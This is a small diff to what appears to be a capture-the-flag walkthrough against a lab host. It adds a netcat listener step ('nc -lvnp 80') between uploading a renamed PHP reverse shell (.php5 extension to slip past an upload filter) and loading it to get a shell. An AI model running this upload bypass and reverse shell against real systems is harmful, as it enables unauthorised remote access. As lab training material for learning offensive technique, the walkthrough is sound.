@@ -62,6 +62,10 @@ mv php-reverse-shell.php php-reverse-shell.php5
 
 Upload to: `http://10.10.196.130/panel/`
 
+```bash
+nc -lvnp 80
+```
+
 Go to: `http://10.10.196.130/uploads/php-reverse-shell.php5`
 
 ```bash
